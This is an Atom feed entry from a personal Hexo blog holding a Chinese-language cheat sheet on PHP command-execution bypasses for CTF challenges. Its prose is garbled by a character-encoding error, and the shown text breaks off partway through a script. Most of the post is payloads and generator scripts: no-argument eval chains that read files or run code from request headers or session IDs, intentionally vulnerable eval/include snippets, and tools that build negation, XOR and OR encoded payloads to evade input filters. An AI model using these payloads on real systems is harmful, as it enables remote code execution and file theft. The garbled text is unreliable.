<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>åˆé›¶Â·b10g~ğŸ¥</title>
  
  
  <link href="https://bowuchuling.github.io/atom.xml" rel="self"/>
  
  <link href="https://bowuchuling.github.io/"/>
  <updated>2023-10-17T10:02:38.714Z</updated>
  <id>https://bowuchuling.github.io/</id>
  
  <author>
    <name>Chu0ğŸ¥</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œæ€»ç»“</title>
    <link href="https://bowuchuling.github.io/posts/1837iuw7.html"/>
    <id>https://bowuchuling.github.io/posts/1837iuw7.html</id>
    <published>2023-10-17T09:58:31.255Z</published>
    <updated>2023-10-17T10:02:38.714Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å¼€ç¯‡æ³¨é‡Šï¼š">å¼€ç¯‡æ³¨é‡Šï¼š</h3><h4 id="linuxåŸºæœ¬å‘½ä»¤ï¼š">linuxåŸºæœ¬å‘½ä»¤ï¼š</h4><h5 id="1-å¸¸è§ç®¡é“ç¬¦">1.å¸¸è§ç®¡é“ç¬¦</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windowsï¼š</span><br><span class="line">â€˜<span class="string">|â€™ ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥</span></span><br><span class="line">â€˜<span class="string">||â€™ å¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥</span></span><br><span class="line">â€˜<span class="meta">&amp;â€™ å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡</span></span><br><span class="line"><span class="meta">&amp;&amp;å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤</span></span><br><span class="line"></span><br><span class="line">linuxï¼š</span><br><span class="line">Linuxç³»ç»ŸåŒ…å«äº†windowsç³»ç»Ÿä¸Šé¢å››ä¸ªä¹‹å¤–ï¼Œè¿˜å¤šäº†ä¸€ä¸ª â€˜;â€™ è¿™ä¸ªä½œç”¨å’Œ â€˜<span class="meta">&amp;â€™ ä½œç”¨ç›¸åŒ</span></span><br></pre></td></tr></table></figure><h5 id="2-è¯»å–æ–‡ä»¶å‘½ä»¤">2.è¯»å–æ–‡ä»¶å‘½ä»¤</h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat<span class="comment">--ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º</span></span><br><span class="line">tac<span class="comment">--ä»æœ€åä¸€è¡Œå€’åºæ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º</span></span><br><span class="line">more<span class="comment">-- æ ¹æ®çª—å£å¤§å°ï¼Œä¸€é¡µä¸€é¡µçš„ç°å®æ–‡ä»¶å†…å®¹</span></span><br><span class="line">less å’Œmoreç±»ä¼¼ï¼Œä½†å…¶ä¼˜ç‚¹å¯ä»¥å¾€å‰ç¿»é¡µï¼Œè€Œä¸”è¿›è¡Œå¯ä»¥æœç´¢å­—ç¬¦</span><br><span class="line">head<span class="comment">-- åªæ˜¾ç¤ºå¤´å‡ è¡Œ</span></span><br><span class="line">tail <span class="comment">--åªæ˜¾ç¤ºæœ€åå‡ è¡Œ</span></span><br><span class="line">nl <span class="comment">--ç±»ä¼¼äºcat -nï¼Œæ˜¾ç¤ºæ—¶è¾“å‡ºè¡Œå·</span></span><br><span class="line">tailf<span class="comment">-- ç±»ä¼¼äºtail -f</span></span><br><span class="line">vim <span class="comment">--ä½¿ç”¨vimå·¥å…·æ‰“å¼€æ–‡æœ¬</span></span><br><span class="line">vi <span class="comment">--ä½¿ç”¨viæ‰“å¼€æ–‡æœ¬cat ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º</span></span><br></pre></td></tr></table></figure><h3 id="1-æ— å‚æ•°rce">1.æ— å‚æ•°rce</h3><h4 id="1-1åŸºæœ¬å‡½æ•°åŠå…¶ä½œç”¨ï¼š">1.1åŸºæœ¬å‡½æ•°åŠå…¶ä½œç”¨ï¼š</h4><table><thead><tr><th>å‡½æ•°</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>foreach($a as $x =&gt; $y)</td><td>$aä¸ºæ•°ç»„,å°†æ•°ç»„åå’Œå€¼å¾ªç¯èµ‹å€¼ç»™$xå’Œ$y</td></tr><tr><td>exit($a)</td><td>è¾“å‡º$aå¹¶é€€å‡ºå½“å‰è„šæœ¬</td></tr><tr><td>show_source()</td><td>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td></tr><tr><td>highlight_file()</td><td>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td></tr><tr><td>readfile()</td><td>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td></tr><tr><td>var_dump()</td><td>æ‰“å°æ•°ç»„ï¼Œæ˜¾ç¤ºæ–‡ä»¶å</td></tr><tr><td>printf()</td><td>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td></tr><tr><td>next()</td><td>æ•°ç»„æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä½</td></tr><tr><td>array_reverse()</td><td>æ•°ç»„ä½ç½®å‰åè°ƒè½¬</td></tr><tr><td>show_source(next(array_reverse(scandir(current(localeconv())))))</td><td></td></tr><tr><td>localeconv()</td><td>è¯¦ç»†çš„è‡ªå·±æœï¼Œè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„ç¬¬ä¸€ä¸ªæ˜¯å°æ•°ç‚¹å­—ç¬¦ï¼Œå› æ­¤å¯ä»¥ç”¨current()æå–ä¸€ä¸ª.</td></tr><tr><td>current()æˆ–pos()</td><td>æå–æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼</td></tr><tr><td>scandir()</td><td>æ˜¾ç¤ºç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶</td></tr><tr><td>scandir(current(localeconv()))</td><td>æŸ¥çœ‹ç›®å½•</td></tr><tr><td>var_dump(scandir(current(localeconv())))</td><td>è¾“å‡ºç›®å½•</td></tr><tr><td>end()</td><td>å–å‡ºæ•°ç»„ä¸­çš„æœ€åä¸€ä½</td></tr><tr><td>chdir()</td><td>ç›®å½•è·³è½¬ï¼Œä¾‹å¦‚chdir(â€˜â€¦â€™)å°±æ˜¯è·³è½¬åˆ°ä¸Šçº§ç›®å½•</td></tr><tr><td>get_defined_vars()</td><td>è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼ˆå…¨å±€å˜é‡ï¼‰</td></tr><tr><td>dirname()</td><td>è¿”å›å½“å‰æ–‡ä»¶çš„è·¯å¾„ï¼Œå°±æ˜¯pwd</td></tr><tr><td>getcwd()</td><td>è¿”å›å½“å‰çš„å·¥ä½œç›®å½•</td></tr><tr><td>getallheaders()</td><td>è¿”å›æ‰€æœ‰çš„è¯·æ±‚å¤´æ•°ç»„</td></tr><tr><td>getenv()</td><td>php7.1ç‰ˆæœ¬ä»¥åæ‰èƒ½ä½¿ç”¨ï¼Œè·å–ç¯å¢ƒå˜é‡</td></tr><tr><td>time()</td><td>è¿”å›å½“å‰çš„Unixæ—¶é—´æˆ³</td></tr><tr><td>localtime()</td><td>å–å¾—æœ¬åœ°æ—¶é—´</td></tr><tr><td>localtime(time())</td><td>è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œ0-60ä¹‹é—´</td></tr></tbody></table><h4 id="1-2session-id">1.2session_id</h4><p>sessionå­—ç¬¦ä¸²åªèƒ½å­˜å‚¨å¤§å°å†™å­—æ¯ä»¥åŠæ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥éœ€è¦å¯¹sessionè¿›è¡Œè½¬æ¢ï¼Œæ“ä½œå¦‚ä¸‹</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">eval</span>(<span class="title">hex2bin</span>(<span class="title">session_id</span>(<span class="title">session_start</span>())));</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">echo</span> <span class="title">bin2hex</span>(<span class="string">&quot;phpinfo();&quot;</span>)=<span class="number">706870696</span><span class="variable">e666f28293b</span>  <span class="comment">//phpæ‰§è¡Œ</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">phpsessionid</span>=</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><h4 id="1-3éšæœºè¯»å–æ–‡ä»¶">1.3éšæœºè¯»å–æ–‡ä»¶</h4><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">highlight_file</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>()))))));</span></span><br></pre></td></tr></table></figure><h4 id="1-4ç”¨è¯·æ±‚å¤´è¿›è¡Œå‘½ä»¤æ‰§è¡Œ">1.4ç”¨è¯·æ±‚å¤´è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</h4><p>æºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="built_in">array</span><span class="constructor">_pop(<span class="params">getallheaders</span>()</span>));</span><br><span class="line"><span class="comment">//è¿™é‡Œçš„array_popæ˜¯å¼¹å‡ºhttpå¤´çš„æœ€åä¸€ä¸ª</span></span><br><span class="line"><span class="comment">//getallheaders()æ˜¯è·å–æ‰€æœ‰è¯·æ±‚å¤´ä¿¡æ¯çš„ä¸€ä¸ªæ•°ç»„</span></span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¯·æ±‚å¤´:</span><br><span class="line">å› ä¸ºå¾—æ˜¯åœ¨æœ€åä¸€ä¸ªï¼Œæ‰€ä»¥ç”¨å­—æ¯è®©ä»–æ’åˆ°æœ€å,ä¾‹å¦‚ï¼š</span><br><span class="line">ZZZZZ=phpinfo();</span><br><span class="line"></span><br><span class="line">æˆ–è€…ä½¿ç”¨</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">pos</span>(<span class="keyword">next</span>(array_reverse(getallheaders())));</span><br></pre></td></tr></table></figure><h3 id="2-æ— å­—æ¯æ•°å­—rce">2.æ— å­—æ¯æ•°å­—rce</h3><p>å¯å‚è€ƒhttps://www.freebuf.com/articles/network/279563.htmlï¼ˆå·²ä¿å­˜ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-1é‡ç‚¹ï¼Œæ¯æ¬¡åšéƒ½å¾—çœ‹">2.1é‡ç‚¹ï¼Œæ¯æ¬¡åšéƒ½å¾—çœ‹</h4><p>é‡åˆ°è¿™ç§çš„ï¼Œå¾—åˆ°è„šæœ¬ä¹‹åç›´æ¥ç”¨è¿ç®—ç¬¦è¿›è¡Œè¿æ¥ï¼Œ1ä¹˜scriptä¹˜1ï¼Œå°±è¿™æ ·çš„æ ¼å¼</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$code =  <span class="keyword">eval</span>(<span class="string">&quot;return $v1$v3$v2;&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="2-2å–åç»•è¿‡">2.2å–åç»•è¿‡</h4><h5 id="Script-1">Script 1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;call_user_func&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;system&#x27;</span>));</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;(~&quot;</span>.<span class="variable">$a</span>.<span class="string">&quot;)(~&quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;,~&quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;,&#x27;&#x27;);&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="Script-2">Script 2</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="2-3å¼‚æˆ–ç»•è¿‡">2.3å¼‚æˆ–ç»•è¿‡</h4><p>è„šæœ¬ä½ç½®wanganscript/xorå’Œwanganscript/,æ¯æ¬¡ä½¿ç”¨è®°å¾—ä¿®æ”¹phpä¸­çš„æ­£åˆ™ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-zA-Z0-9_$@]+/&#x27;</span>; <span class="comment">//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>)) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><h4 id="2-4æˆ–ç»•è¿‡">2.4æˆ–ç»•è¿‡</h4><p>è„šæœ¬ä½ç½®wanganscript/or,æ¯æ¬¡ä½¿ç”¨è®°å¾—ä¿®æ”¹phpä¸­çš„æ­£åˆ™ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-zA-Z0-9_$@]+/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span 